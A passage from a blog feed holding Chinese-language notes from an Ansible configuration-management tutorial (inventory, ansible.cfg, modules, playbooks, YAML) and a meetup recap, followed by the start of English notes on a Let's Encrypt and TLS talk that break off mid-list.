&lt;li&gt;Place  &lt;ul&gt;
&lt;li&gt;成功大學資訊新館 203 電腦教室  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.google.com/presentation/d/136VKHI_H8wKyrLIm1eaTMLz82uoPgjV4zTiGb1_-_Ig/edit#slide=id.p"&gt;Slides&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/files/study-area-ansible-tutorial-note/"&gt;Jupyter Notebook using in this tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Configure Management 四大金釵:  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ansible/ansible"&gt;Ansible&lt;/a&gt; (Python)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/chef/chef"&gt;Chef&lt;/a&gt; (Ruby)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/puppetlabs/puppet"&gt;Puppet&lt;/a&gt; (Ruby)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/saltstack/salt"&gt;Salt&lt;/a&gt; (Python)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ansible 現在有 modules 可以控制 Windows  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;About Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ansible - configuration management tool 組態管理工具  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ansible.com/"&gt;Official Website&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ansible/ansible"&gt;GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Online resource 線上資源  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.ansible.com/"&gt;Documentation 文件&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://galaxy.ansible.com/"&gt;Ansible Galaxy&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;社群共享 Role 集散地  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://groups.google.com/forum/#!forum/ansible-project"&gt;Ansible Project Google Group 討論群組&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;irc.freenode.net: #ansible  &lt;ul&gt;
&lt;li&gt;Brian Coca 非常熱心，有問題問他就好(?)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Why Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Infrastructure as Code  &lt;/li&gt;
&lt;li&gt;語法簡單 (playbook 以 YAML 語法撰寫)  &lt;/li&gt;
&lt;li&gt;不需要安裝 client (clientless)  &lt;/li&gt;
&lt;li&gt;Push-based  &lt;ul&gt;
&lt;li&gt;Pull-bsaed: Agent check to server by time. (Chef / Puppet by default)  &lt;/li&gt;
&lt;li&gt;Push-based: Server push change by order  &lt;ul&gt;
&lt;li&gt;你可以決定何時進行設定  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Very thin layer of abstraction  &lt;ul&gt;
&lt;li&gt;以原有的習慣進行部署  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;預備知識&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ssh  &lt;/li&gt;
&lt;li&gt;CLI  &lt;/li&gt;
&lt;li&gt;安裝套件  &lt;/li&gt;
&lt;li&gt;sudo  &lt;/li&gt;
&lt;li&gt;管理檔案權限  &lt;/li&gt;
&lt;li&gt;管理 service  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;How to install Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.ansible.com/ansible/intro_installation.html"&gt;https://docs.ansible.com/ansible/intro_installation.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;The role of Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Control Machine  &lt;ul&gt;
&lt;li&gt;Control managed nodes  &lt;/li&gt;
&lt;li&gt;Need Python 2.6 above  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Managed Node  &lt;ul&gt;
&lt;li&gt;Remote server  &lt;/li&gt;
&lt;li&gt;Need Python 2.5 above  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;預設一次五台主機佈署, 可以調整 forks 變數來改變預設值。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Difference between shell script&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;不用登入遠端去抓 shell script 與執行 (中央集權)  &lt;/li&gt;
&lt;li&gt;會從佈署失敗的地方開始繼續，不會整個重跑。  &lt;/li&gt;
&lt;li&gt;針對所有主機同時進行，&lt;strong&gt;按照順序&lt;/strong&gt;執行任務  &lt;/li&gt;
&lt;li&gt;有許多現成的 Module 可用,用法習慣跟原系統差不多  &lt;/li&gt;
&lt;li&gt;有別人寫好的 Role 可以參考與套用 (Ansible-galaxy)  &lt;/li&gt;
&lt;li&gt;語法簡單，容易上手(YAML)  &lt;/li&gt;
&lt;li&gt;可以利用 fact 與變數執行 loop 或是其他的做法  &lt;/li&gt;
&lt;li&gt;有別人寫好的 Role 可以參考與套用：&lt;a href="https://galaxy.ansible.com/"&gt;Ansible Galaxy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;The first Ansible command for you&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ansible 對象 -m ping&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Usage&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ansible&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;pattern&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;  
    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="n"&gt;INVENTORY&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;inventory&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;INVENTORY&lt;/span&gt; &lt;span class="n"&gt;specify&lt;/span&gt; &lt;span class="n"&gt;inventory&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="sr"&gt;/ansible/&lt;/span&gt;&lt;span class="n"&gt;hosts&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="n"&gt;MODULE_NAME&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MODULE_NAME&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;execute&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Inventory File&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ansible lists hosts in text files, called &lt;strong&gt;inventory files&lt;/strong&gt;.  &lt;/li&gt;
&lt;li&gt;將遠端主機相關資訊以文字檔案的方式建立稱為 inventory file, 常見的檔案名稱為 hosts  &lt;/li&gt;
&lt;li&gt;語法 &lt;code&gt;servername  options&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;可以設定群組 &lt;code&gt;[群組名稱]&lt;/code&gt; 來組織對象  &lt;/li&gt;
&lt;li&gt;常用選項  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_host -- Remote Host IP&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_user -- Remote SSH User Name&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_private_key_file -- SSH Key&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_port -- ssh port&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_pass -- ssh password&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果有定義到 &lt;code&gt;ansible.cfg&lt;/code&gt; 的 &lt;code&gt;[defaults]&lt;/code&gt; 就可以不列出  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;ansible.cfg&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ansible.cfg&lt;/code&gt; looks for this order:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;File specified by the ANSIBLE_CONFIG (-i option)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;./ansible.cfg&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;~/.ansible.cfg&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/ansible/ansible.cfg&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可以設定一些預設行為，不需要逐一設定在 hosts  &lt;/p&gt;
&lt;p&gt;example:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[defaults]  
# hostfile -- 主機 ip 對照  
hostfile = hosts  

# remote_user -- 遠端使用者名稱  
remote_user = root  

# private_key_file -- SSH privite key path  
# host_key_checking -- 不詢問加入 ssh 金鑰  
host_key_checking = False  

# 設定 retry files (*.retry) 存放路徑, 預設放家目錄  
# 我自己喜歡指定在目前目錄, 以免作完實驗家目錄一堆 .retry  
retry_files_save_path = ./ansible-retry  

# 平行處理數量, 預設是 5 個, 應該不一定會用到先記下來  
# forks = 20  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Ansible Module&lt;/h3&gt;
&lt;p&gt;Ansible 使用上, 會根據不同的功能呼叫不同的 Module  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Module 目錄： &lt;a href="http://docs.ansible.com/ansible/modules_by_category.html"&gt;http://docs.ansible.com/ansible/modules_by_category.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://docs.ansible.com/ansible/list_of_all_modules.html"&gt;All Modules — Ansible Documentation&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;System module  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Notification Modules  &lt;ul&gt;
&lt;li&gt;IRC  &lt;/li&gt;
&lt;li&gt;Slack  &lt;/li&gt;
&lt;li&gt;Jabber  &lt;/li&gt;
&lt;li&gt;email  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Hands on Lab with Module&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ansible 對象 -m 模組名稱 -a 要傳入的參數&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;官方文件該怎麼看&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;官方 doc 的 Options 先看 required  &lt;/li&gt;
&lt;li&gt;required 裏面先看 yes 的就好  &lt;/li&gt;
&lt;li&gt;Example 沒差，因為有時候是騙你的XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Playbook&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Playbook 包含很多 Play&lt;br /&gt;
Play 就是你要執行的工作&lt;br /&gt;
Play 裏面包含很多 hosts&lt;br /&gt;
Play 裏面有 tasks 定義要做哪些事&lt;br /&gt;
而 tasks 做的事，可以透過 modules 達成  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;使用 YAML 語法  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A script is called a playbook.&lt;/strong&gt; (類似一個 shell script)  &lt;ul&gt;
&lt;li&gt;包含要進行組態的主機  &lt;/li&gt;
&lt;li&gt;以及順序進行的工作  &lt;/li&gt;
&lt;li&gt;包含許多的 play (&lt;code&gt;*.yml&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ansible 針對所有的主機同時 (平行) 執行tasks.  &lt;ul&gt;
&lt;li&gt;Ansible 會等待所有主機 task 完成之後，才會進行下一個 task  &lt;/li&gt;
&lt;li&gt;Ansible &lt;strong&gt;按照順序執行&lt;/strong&gt; tasks  &lt;/li&gt;
&lt;li&gt;如果遇到錯誤的話就會立即停止，但在下次執行的時候，可以從上次錯誤跳出的地方繼續。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ansible playbooks 以 YAML 語法撰寫，簡單易讀。  &lt;/li&gt;
&lt;li&gt;使用 ansible-playbook 指令執行  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible-playbook&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible-playbook  --verbose 顯示詳細資訊&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible-playbook  --check 不實際執行 dry run&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;YAML 語法&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Yet Another Markup Language  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://yaml.org/"&gt;http://yaml.org/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/YAML"&gt;https://zh.wikipedia.org/wiki/YAML&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Start of File  &lt;ul&gt;
&lt;li&gt;以 3 個 &lt;code&gt;---&lt;/code&gt; 開始, 不加上去也可以  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Comment  &lt;ul&gt;
&lt;li&gt;以 &lt;code&gt;#&lt;/code&gt; 來進行單行註解  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;#&lt;/code&gt; 就是註解的開始（跟 shell script 一樣）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Strings  &lt;ul&gt;
&lt;li&gt;不一定要加上引號  &lt;/li&gt;
&lt;li&gt;可是有的時候為了易讀性，可以使用單引號或是雙引號  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Booleans  &lt;ul&gt;
&lt;li&gt;使用 True 或是 Yes 都可以視為真  &lt;/li&gt;
&lt;li&gt;但是還是用 True 不會混亂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lists (delimited with hyphens)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- My Fair Lady  
- Oklahoma  
# inline 格式list  
[My Fair Lady, Oklahoma, The Pirates of Penzance]  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Dictionaries  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;742&lt;/span&gt; &lt;span class="n"&gt;Evergreen&lt;/span&gt; &lt;span class="n"&gt;Terrace&lt;/span&gt;  
&lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;North&lt;/span&gt; &lt;span class="n"&gt;Takoma&lt;/span&gt;  
&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;inline&lt;/span&gt;  &lt;span class="err"&gt;格式&lt;/span&gt;  
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;742&lt;/span&gt; &lt;span class="n"&gt;Evergreen&lt;/span&gt; &lt;span class="n"&gt;Terrace&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;city&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Springfield&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;North&lt;/span&gt; &lt;span class="n"&gt;Takoma&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Plays&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;每一個 play 包含  &lt;ul&gt;
&lt;li&gt;A set of hosts to configure. （目標主機）  &lt;/li&gt;
&lt;li&gt;A list of tasks to be executed on those hosts. （工作內容）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常用的設定  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;name&lt;/code&gt; - 執行的 play 或是 task 名稱  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo&lt;/code&gt; - 要不要執行 sudo  &lt;ul&gt;
&lt;li&gt;已經改叫 &lt;code&gt;become&lt;/code&gt; 了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars&lt;/code&gt; - 變數設定  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tasks  &lt;ul&gt;
&lt;li&gt;要在遠端主機執行的工作  &lt;ul&gt;
&lt;li&gt;Modules  &lt;ul&gt;
&lt;li&gt;Modules are scripts that come packaged with Ansible.  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.ansible.com/ansible/modules_by_category.html"&gt;http://docs.ansible.com/ansible/modules_by_category.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;register, debug 觀察錯誤的時候用&lt;br /&gt;
通常會用到都不是什麼好事情XD  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Hands on Lab with Playbook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="/file/study-area-ansible-tutorial-note/SA_playbook/shell_yum_when.yml"&gt;playbook using in this hands on&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible/tree/master/books/Oreilly-Up-And-Running-Ansible/playbooks"&gt;Some playbook examples&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible/blob/master/books/Oreilly-Up-And-Running-Ansible/playbooks/SA_20151226_Tainan_Ansible.yml"&gt;The playbook for hands on environment for this tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/sakana/jupyterhub/"&gt;The docker file for hands on environment for this tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References / Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://shop.oreilly.com/product/0636920035626.do"&gt;Ansible Up &amp;amp; Running&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sakananote2.blogspot.tw/"&gt;sakananote&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/sakana/ansible2.x_ubuntu14043/"&gt;https://hub.docker.com/r/sakana/ansible2.x_ubuntu14043/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/sakana/jupyterhub/"&gt;https://hub.docker.com/r/sakana/jupyterhub/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible/blob/master/Mindmap"&gt;Ansible Mind Map&lt;/a&gt; (Use FreeMind to open it)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible"&gt;sakanamax/LearnAnsible · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.ansible.com/ansible/guide_gce.html"&gt;Google Cloud Platform Guide — Ansible Documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;聽完後覺得 Anisble 真的蠻方便的，&lt;br /&gt;
基本上就是把 shell script 包裝起來的概念，&lt;br /&gt;
感覺可以直接取代 shell script 了。&lt;br /&gt;
可以很簡單得用 YAML 撰寫 playbook 來針對不同作業系統做不同的事，&lt;br /&gt;
在 playbook 中的每一個 play 都代表著一個步驟，&lt;br /&gt;
每一個 play 在 Jupyter notebook 中也都會顯示執行結果，&lt;br /&gt;
有種 unittest 的味道。有些人喜歡有些人不喜歡（誤）&lt;br /&gt;
然後也不需要在 managed nodes 上裝任何 clients，&lt;br /&gt;
只要 managed nodes 能夠用 ssh 登入進去，&lt;br /&gt;
就可以直接都在 contorl machine 上操作。  &lt;/p&gt;
&lt;p&gt;比較有趣的是講者有提到他們會直接使用 Jupyter notebook (IPython notebook)&lt;br /&gt;
讓不懂 playbook 詳細細節的人也可以操作，&lt;br /&gt;
因為 Jupyter notebook 可以在每個 play 加上說明，&lt;br /&gt;
所以要交接的時候可以直接丟出這些 Jypyter notebooks 就無痛交接。  &lt;/p&gt;
&lt;p&gt;會後跟凍仁拿到了之前一直想拿的 Vim 貼紙，&lt;br /&gt;
還獲得了凍仁的 MOPCON 名片，&lt;br /&gt;
然後和小飛機、小趴、CrBoy、雨蒼從 Ansible 聊到刑事訴訟法的灰色地帶XD&lt;br /&gt;
（其實警察臨檢要搜身或者搜車的話，如果沒有搜索令其實是違法的之類的）  &lt;/p&gt;
&lt;p&gt;之後去 Double Cheese 聚餐，&lt;br /&gt;
在等待的時候又聊到了學校資訊系統的共同問題，&lt;br /&gt;
Single Sign-On, 選課系統之類的...&lt;br /&gt;
用餐的時候就坐在鳥哥(vbird)的對面！&lt;br /&gt;
當初小高一的時候用 Ubuntu 就是看著鳥哥的網站學 Linux 指令的啊！&lt;br /&gt;
今天本人竟然就在我對面！&lt;br /&gt;
鳥哥的人好親切啊，竟然還幫我倒飲料&amp;gt;"&amp;lt;&lt;br /&gt;
然後又聊到了威妥碼拼音、通用拼音、漢語拼音的故事。&lt;br /&gt;
StudyArea 好像是我參與的社群裏面第一次可以這麼快聊起來的，&lt;br /&gt;
真的很開心。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2015/12/26 寫於成功大學資訊舊館前  &lt;ul&gt;
&lt;li&gt;(好多蚊子啊！)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016/07/16 Study Area 2016 群英會  &lt;ul&gt;
&lt;li&gt;補充一些新的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 16 Jul 2016 15:17:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2015-12-26:posts/2015/12/26/study-area-ansible-tutorial-note/</guid><category>Python</category><category>Ansible</category><category>DevOps</category><category>automation</category><category>Meetup</category></item><item><title>A Free Certificate Authority to Encrypt the Entire Web</title><link>https://blog.m157q.tw/posts/2015/11/27/a-free-certificate-authority-to-encrypt-the-entire-web/</link><description>&lt;p&gt;KKTIX URL: &lt;a href="http://ocftw.kktix.cc/events/imhp"&gt;專家講座：資訊與人權的交會&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Let's Encrypt: A Free Certificate Authority to Encrypt the Entire Web&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Seth Schoen - Senior staff at Electronic Frontier Foundation  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Acronyms&lt;/h2&gt;
&lt;p&gt;SSL, TLS, HTTPS, X.509, PKI, CA  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSL (Secure Sockets Layer)  &lt;ul&gt;
&lt;li&gt;The old name for the main security layer for TCP  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TLS (Transport Layer Security)  &lt;ul&gt;
&lt;li&gt;The modern name of SSL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Importance of TLS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Still occasionally dealing with the idea that it's only needed for finalncial data.  &lt;/li&gt;
&lt;li&gt;... more often these days, the idea that it's only needed for logins.  &lt;/li&gt;
&lt;li&gt;We need to articulate a stronger vision that networks are untrustworthy and commmunications need to be protected.  &lt;/li&gt;
&lt;li&gt;Networks are routinely attacking us and plain HTTP offers no defense.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We need security for everything on the Internet?  &lt;/p&gt;
&lt;h2&gt;Just a few examples&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Sidejacking and location tracking  &lt;/li&gt;
&lt;li&gt;Integrity of software downloads  &lt;/li&gt;
&lt;li&gt;Reader privacy (although size of documents is still an enormous problem)  &lt;ul&gt;
&lt;li&gt;ex: Medical info site with searchiin function but no HTTPS connection.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-based censorship prevention  &lt;ul&gt;
&lt;li&gt;Ad, Cookies  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protection against ad injection, tracking-header-injection and even malware injection at ISP  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Barriers to adoption&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Perception that TLS is slow (especially for session establishment) or is very computationally intensive  &lt;/li&gt;
&lt;li&gt;Difficulty integrating into some server and data center designs (like load balancing)  &lt;/li&gt;
&lt;li&gt;Cost and effort of obtaining and managing PKI certificates  &lt;/li&gt;
&lt;li&gt;Even a skilled person who understands PKI conceptually may take ~1 hour to get and deploy a cert... and then it may expire, or omit some vhosts.  &lt;ul&gt;
&lt;li&gt;People say it's waste of my time and not worth it.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Let's Encrypt&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Initially, a collaboration among EFF, University of Michigan, and Mozilla  &lt;ul&gt;
&lt;li&gt;to create a fully automated CA to issus certificates to any site for any purpose, quickly and at no charge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Aiming to be cheaper, easier, and more secure than existing CAs  &lt;/li&gt;
&lt;li&gt;Thanks to partners including Akamai, Cisco, and IdenTrust, we have publicly  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Cross-signing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Root CAs can and do delegate their authority to intermediate CAs - currently hundreds of named entities  &lt;/li&gt;
&lt;li&gt;Browsers then automatically trust these intermediates; end-entity certs are almost always signed by intermediates, not roots  &lt;/li&gt;
&lt;li&gt;Our CA is now cross-signed by IdenTrust; &lt;em&gt;mainstream browsers trust us today&lt;/em&gt;;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Let's Encrypt concept&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Clien (User's Web Server), Sever (Let's Encrypt CA)  &lt;/li&gt;
